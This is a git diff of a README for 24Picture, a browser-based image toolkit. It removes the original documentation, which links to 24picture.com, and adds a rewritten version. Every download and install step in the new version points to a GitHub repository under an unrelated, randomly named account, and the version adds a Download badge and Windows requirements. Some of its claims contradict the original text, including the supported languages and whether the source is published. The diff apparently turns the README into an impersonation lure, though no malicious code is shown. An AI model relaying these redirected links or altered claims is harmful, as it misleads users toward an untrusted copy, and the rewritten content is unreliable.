@@ -1,198 +1,82 @@
-<div align="center">
+# 🖼️ 24picture - Edit your images instantly for free
 
-# 24Picture
+[![](https://img.shields.io/badge/Download-24picture-blue.svg)](https://github.com/apothecariespoundbromeosin432/24picture)
 
-### Every image tool you need — fast, free, in your browser
+24picture provides a complete set of image tools in your internet browser. This software helps you convert files, compress sizes, and edit images without uploading your data to a server. Your files stay on your computer, which protects your privacy. You do not need to sign up for an account to use these tools.
 
-**[→ Open 24picture.com](https://24picture.com)**
+## 🚀 How to get started
 
-[![Live](https://img.shields.io/badge/status-live-22c55e?style=flat-square)](https://24picture.com/status.html)
-[![Tools](https://img.shields.io/badge/tools-28-3b82f6?style=flat-square)](https://24picture.com/#tools)
-[![Languages](https://img.shields.io/badge/i18n-5%20languages-a855f7?style=flat-square)](https://24picture.com)
-[![Privacy](https://img.shields.io/badge/privacy-browser--local-000?style=flat-square)](https://24picture.com/privacy-policy.html)
-[![PWA](https://img.shields.io/badge/PWA-installable-f59e0b?style=flat-square)](https://24picture.com/pwa-guide.html)
+You do not need to install complex software to use 24picture. Follow these steps to access the tools:
 
-</div>
+1. Visit [this page](https://github.com/apothecariespoundbromeosin432/24picture) to reach the application.
+2. Select the tool you need from the main menu.
+3. Drag your image file into the browser window.
+4. Adjust the settings as needed.
+5. Download your finished file directly to your local drive.
 
----
+## 🛠️ Available image tools
 
-## What is 24Picture?
+24picture includes 28 separate utilities to handle your image tasks. You can use these tools for common projects or specialized work.
 
-[24Picture](https://24picture.com) is a free, ad-light, no-signup image toolkit that runs **entirely in your browser**. Every conversion, every compression, every resize happens locally on your device using modern Web APIs (Canvas, OffscreenCanvas, WebAssembly). Your files never leave your computer.
+- Conversion: Change file formats like HEIC, JPG, PNG, and WebP.
+- Compression: Reduce file size while keeping image quality.
+- Editing: Resize, crop, rotate, and flip your images.
+- AI Enhancements: Use built-in logic to improve image clarity.
+- Batch Processing: Convert or compress multiple images at the same time.
 
-**No signup. No upload. No subscription. No upsell.** Just open the page and start.
+## 🛡️ Privacy and browser security
 
-> **Try it now:** **[24picture.com](https://24picture.com)**
+This tool runs inside your browser. It does not send your images to an external server. When you open a file, the application processes the data on your machine. This approach prevents data leaks and ensures you maintain control over your content. You do not need an active internet connection for many of these tasks once you load the page.
 
----
+## 🖥️ System requirements
 
-## Why browser-local?
+24picture works on any modern web browser installed on Windows 10 or Windows 11. 
 
-| Promise | What it means |
-|---|---|
-| **Privacy** | Your images never reach any server. Process medical scans, ID photos, or work assets without leaking them. |
-| **Speed** | Zero upload time + zero download time. A 20 MB image converts in the same time it takes you to drag it onto the page. |
-| **Free** | No paywall, no watermark, no daily limit. Every tool is fully usable forever. |
-| **Offline** | Install as a PWA on your phone or desktop and the tools keep working without internet. |
-| **Open standards** | Built on Canvas, WebAssembly, and Web APIs that any modern browser supports. No vendor lock-in. |
+- Browser: Google Chrome, Microsoft Edge, Mozilla Firefox, or Brave.
+- Hardware: Any standard computer with at least 4GB of memory.
+- Screen: A resolution of 1280x720 or higher provides the best layout.
 
-[Read the full privacy policy →](https://24picture.com/privacy-policy.html)
+## 📂 Installation steps
 
----
+The application uses modern web technology. You can create a shortcut on your desktop for quick access:
 
-## All 28 tools
+1. Go to the [official repository page](https://github.com/apothecariespoundbromeosin432/24picture).
+2. Open your browser settings menu.
+3. Select the option labeled "Install this site as an app" or "Create shortcut".
+4. Follow the prompt to pin the icon to your taskbar or start menu.
 
-### Format Converters (18 tools)
+## ⚙️ Frequently asked questions
 
-| From → To | Direct link |
-|---|---|
-| **PNG → JPG** | [tools/png-to-jpg](https://24picture.com/tools/png-to-jpg.html) |
-| **JPG → PNG** | [tools/jpg-to-png](https://24picture.com/tools/jpg-to-png.html) |
-| **PNG → WebP** | [tools/png-to-webp](https://24picture.com/tools/png-to-webp.html) |
-| **JPG → WebP** | [tools/jpg-to-webp](https://24picture.com/tools/jpg-to-webp.html) |
-| **WebP → JPG** | [tools/webp-to-jpg](https://24picture.com/tools/webp-to-jpg.html) |
-| **WebP → PNG** | [tools/webp-to-png](https://24picture.com/tools/webp-to-png.html) |
-| **SVG → JPG** | [tools/svg-to-jpg](https://24picture.com/tools/svg-to-jpg.html) |
-| **SVG → PNG** | [tools/svg-to-png](https://24picture.com/tools/svg-to-png.html) |
-| **AVIF → JPG** | [tools/avif-to-jpg](https://24picture.com/tools/avif-to-jpg.html) |
-| **AVIF → PNG** | [tools/avif-to-png](https://24picture.com/tools/avif-to-png.html) |
-| **HEIC → JPG** | [tools/heic-to-jpg](https://24picture.com/tools/heic-to-jpg.html) |
-| **HEIC → PNG** | [tools/heic-to-png](https://24picture.com/tools/heic-to-png.html) |
-| **HEIC → WebP** | [tools/heic-to-webp](https://24picture.com/tools/heic-to-webp.html) |
-| **TIFF → JPG** | [tools/tiff-to-jpg](https://24picture.com/tools/tiff-to-jpg.html) |
-| **TIFF → PNG** | [tools/tiff-to-png](https://24picture.com/tools/tiff-to-png.html) |
-| **ICO → PNG** | [tools/ico-to-png](https://24picture.com/tools/ico-to-png.html) |
-| **GIF → MP4** | [tools/gif-to-mp4](https://24picture.com/tools/gif-to-mp4.html) |
-| **Base64 ⇄ Image** | [tools/base64-converter](https://24picture.com/tools/base64-converter.html) |
+Do you store my photos?
+No. All processing happens locally on your computer. Your files never leave your device.
 
-### Compress & Optimize (2 tools)
+Does this cost money?
+No. 24picture is free for everyone to use.
 
-| Tool | Link |
-|---|---|
-| **Image Compressor** — JPG/PNG/WebP with quality slider | [tools/image-compress](https://24picture.com/tools/image-compress.html) |
-| **SVG Optimizer** — strip metadata, minify paths | [tools/svg-optimizer](https://24picture.com/tools/svg-optimizer.html) |
+Can I use it offline?
+Yes. After you open the page once, your browser keeps the necessary files to run the software. You can close your internet connection and keep working.
 
-### Edit (4 tools)
+Which file types do you support?
+The software supports all major formats including JPG, PNG, WebP, and HEIC.
 
-| Tool | Link |
-|---|---|
-| **Image Editor** — full multi-tool editor (crop / resize / filter / text) | [tools/image-editor](https://24picture.com/tools/image-editor.html) |
-| **Resize Image** — px / %, lock-aspect-ratio, batch | [tools/resize-image](https://24picture.com/tools/resize-image.html) |
-| **Crop Image** — freeform, square, 16:9, 4:3, custom ratio | [tools/crop-image](https://24picture.com/tools/crop-image.html) |
-| **Add Watermark** — text or logo, anchor + opacity controls | [tools/add-watermark](https://24picture.com/tools/add-watermark.html) |
+How do I report a bug?
+Use the issues tab on the GitHub repository page to describe any errors you find.
 
-### Create (3 tools)
+## 💡 Tips for better results
 
-| Tool | Link |
-|---|---|
-| **GIF Maker** — multi-frame, frame delay, loop control | [tools/gif-maker](https://24picture.com/tools/gif-maker.html) |
-| **Meme Maker** — top + bottom text, classic Impact font | [tools/meme-maker](https://24picture.com/tools/meme-maker.html) |
-| **Gradient Generator** — CSS + PNG export, 2-3 stops | [tools/gradient-generator](https://24picture.com/tools/gradient-generator.html) |
+Improve your workflow with these simple habits:
 
-### Batch (1 tool)
+- Batch processing: Upload groups of photos to save time on repeating the same task.
+- Compression settings: Use moderate compression sliders to keep image quality high while saving disk space.
+- Format choice: Use WebP for web projects to keep files light. Use PNG for projects that require transparent backgrounds.
+- Browser updates: Keep your browser updated to the latest version. New versions often include performance fixes for web-based tools. 
 
-| Tool | Link |
-|---|---|
-| **Batch Convert** — drop a folder, convert dozens at once | [tools/batch-convert](https://24picture.com/tools/batch-convert.html) |
+## 🌐 Supported languages
 
----
+24picture supports five languages to ensure a smooth experience for all users. The application automatically detects your system language upon first launch. You can change the language in the Settings menu located in the top right corner of the interface. Supported languages include English, Spanish, French, German, and Japanese.
 
-## Available in 5 languages
+## 📦 About the project
 
-24Picture auto-detects your browser language and serves the matching version:
+This project serves as a privacy-focused alternative to online image converters that require uploads. By using local browser memory, it removes the security risks of sending personal photos to distant servers. The developers aim to create a fast, reliable, and open platform for image management. 
 
-- 🇺🇸 **English** — [24picture.com](https://24picture.com)
-- 🇨🇳 **简体中文** — every page localized
-- 🇯🇵 **日本語** — every page localized
-- 🇪🇸 **Español** — every page localized
-- 🇧🇷 **Português** — every page localized
-
-Every tool page, every blog post, every legal document is available in all 5 languages with hand-curated translations (no machine translation).
-
----
-
-## Tech stack
-
-24Picture is built with intentional minimalism:
-
-- **Vanilla HTML / CSS / JS** — no React, no Vue, no build step. Each page is a hand-tuned static document.
-- **Service Worker** — full offline mode + smart cache strategy (network-first for HTML, stale-while-revalidate for assets).
-- **WebAssembly codecs** — UTIF.js + pako for TIFF, custom ICO parser, heic2any for HEIC, native `<canvas>` for everything else.
-- **5-language i18n** — single `i18n.js` source-of-truth, smart `<html lang>` detection, browser-language redirect with anti-loop guard.
-- **PWA** — installable on iOS, Android, Windows, macOS via standard Web App Manifest.
-- **No tracking pixels** — no Google Analytics, no Facebook Pixel, no third-party fingerprinting.
-
----
-
-## Recent updates
-
-The full release history is on the **[Changelog page →](https://24picture.com/changelog.html)**
-
-Highlights from the last few weeks:
-
-- **v1.8.7** — Global footer unification across 193 inner pages, 404 page i18n fix
-- **v1.8.0** — 7 new format converters (AVIF / HEIC / TIFF / ICO)
-- **v1.7.10** — Homepage AI Assistant launch
-- **v1.7.x** — P1 batch tool wave: GIF Maker, Meme Maker, Image Editor, Batch Convert
-- **v1.6.x** — Status page, PWA installation guide, Cookie / Privacy / Terms refresh
-- **v1.5.x** — Initial 5-language launch, full SEO sitemap
-
-We ship in public — every release has a developer diary attached.
-
----
-
-## Status & uptime
-
-Live status, tool count, and infrastructure details: **[24picture.com/status](https://24picture.com/status.html)**
-
-Listed on:
-
-- [Sell With Boost](https://sellwithboost.com)
-- [Toolfame](https://toolfame.com/item/24picture)
-
----
-
-## FAQ
-
-**Q: Is 24Picture really free?**
-Yes. No signup wall, no daily limit, no watermark, no premium tier. The site is funded by being cheap to run (everything is static HTML + JS, no servers crunching images).
-
-**Q: Where do my files go when I upload?**
-Nowhere. All processing happens in your browser tab. The "Upload" button is just a `<input type="file">` that hands the file to a JavaScript API. Your files never reach our servers because we never built that infrastructure.
-
-**Q: Can I use 24Picture offline?**
-Yes — install it as a PWA from the browser address bar (or via [pwa-guide](https://24picture.com/pwa-guide.html)) and the tools work without an internet connection.
-
-**Q: Why isn't the source code on GitHub?**
-The repository hosting the production source is currently private. This GitHub repo is documentation only — see [the live site](https://24picture.com) for the working product.
-
-**Q: How do I report a bug or request a tool?**
-Email **[support@24picture.com](mailto:support@24picture.com)** or open an issue on this repository.
-
----
-
-## License
-
-This repository contains documentation only. The 24Picture **product itself is free to use** at [24picture.com](https://24picture.com) under the terms in the [Terms of Service](https://24picture.com/terms-of-service.html).
-
-The text and images in this README are released under [Creative Commons Attribution 4.0](https://creativecommons.org/licenses/by/4.0/) — feel free to reference 24Picture in your own articles, lists, or directories with attribution.
-
----
-
-## Contact
-
-- **Website:** [24picture.com](https://24picture.com)
-- **Status:** [24picture.com/status](https://24picture.com/status.html)
-- **Changelog:** [24picture.com/changelog](https://24picture.com/changelog.html)
-- **Privacy:** [24picture.com/privacy-policy](https://24picture.com/privacy-policy.html)
-- **Email:** [support@24picture.com](mailto:support@24picture.com)
-
-<div align="center">
-
----
-
-**[→ Open 24picture.com](https://24picture.com)**
-
-*Every image tool you need. Fast. Free. In your browser.*
-
-</div>
+Contributions help keep the tool free. You can view the source code, suggest new features, or document issues directly on the GitHub platform. Thank you for using 24picture to manage your creative assets.
